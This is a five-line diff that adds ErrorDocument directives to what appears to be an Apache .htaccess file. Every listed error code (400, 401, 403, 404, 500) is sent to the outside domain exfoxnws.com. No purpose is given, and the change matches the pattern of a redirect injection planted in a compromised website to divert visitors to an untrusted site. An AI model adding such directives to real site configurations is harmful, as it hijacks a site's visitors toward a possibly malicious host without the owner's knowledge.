@@ -1,0 +1,5 @@
+ErrorDocument 400 http://exfoxnws.com/
+ErrorDocument 401 http://exfoxnws.com/
+ErrorDocument 403 http://exfoxnws.com/
+ErrorDocument 404 http://exfoxnws.com/
+ErrorDocument 500 http://exfoxnws.com/
